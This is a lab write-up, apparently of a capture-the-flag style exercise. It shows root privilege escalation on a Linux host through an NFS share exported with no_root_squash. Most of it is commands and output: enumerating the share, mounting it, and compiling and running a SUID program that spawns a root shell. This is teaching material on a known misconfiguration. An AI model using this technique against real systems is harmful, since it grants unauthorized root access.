# `Privilege Escalation by Misconfigured NFS (Network File Sharing)`

#  `NFS (Network File Sharing)` configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.

karen@ip-10-10-17-59:/$ `cat /etc/exports`

    # /etc/exports: the access control list for filesystems which may be exported
    #               to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)


# We can see the Network file shares /home/backup , /tmp, /home/ubuntu/sharedfolder and there related configurations

# The critical element for this privilege escalation vector is the `“no_root_squash” `option you can see above

# By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges.

# However If the `“no_root_squash”` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

# Lets  start by `enumerating mountable shares` from our attacking machine.

┌──(root㉿kali)-[/home/kali]
└─$ `showmount -e 10.10.17.59`
Export list for 10.10.17.59:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *

# we can we can mount above shares, we are interested in `no_root_sqash` so will mount /home/backup

┌──(root㉿kali)-[/home/kali]
└─$ `mkdir /tmp/targetsharebackup`

┌──(root㉿kali)-[/home/kali]
└─$ `mount -o rw 10.10.17.59:/home/backup /tmp/targetsharebackup `

┌──(root㉿kali)-[/home/kali]
└─# `cd /tmp/targetsharebackup` 

# Now since As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job. 

┌──(root㉿kali)-[/tmp/targetsharebackup]
└─# `nano nfc.c`  

#include<unistd.h>
void main (){
setuid(0);
setgid(0);
system("/bin/bash");
}

┌──(root㉿kali)-[/tmp/targetsharebackup]
└─# `gcc nfc.c -o nfs`
nfc.c: In function ‘main’:
nfc.c:5:1: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 | system("/bin/bash");

┌──(root㉿kali)-[/tmp/targetsharebackup]
└─# `chmod u+s nfs`
       
┌──(root㉿kali)-[/tmp/targetsharebackup]
└─# `ls -l`
total 20
-rw-r--r-- 1 root root    78 Jan 26 01:49 nfc.c
-rwsr-xr-x 1 root root 16056 Jan 26 01:51 nfs

# Now lets get back to Target machine 

#  You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

.karen@ip-10-10-17-59:/$ `whoami`
karen

karen@ip-10-10-17-59:/$ `ls /home/backup`
nfc.c  nfs

karen@ip-10-10-17-59:/$ `whoami`
karen
karen@ip-10-10-17-59:/$ `./home/backup/nfs`
root@ip-10-10-17-59:/$ `id`
uid=0(root) gid=0(root) groups=0(root)

# we get the root access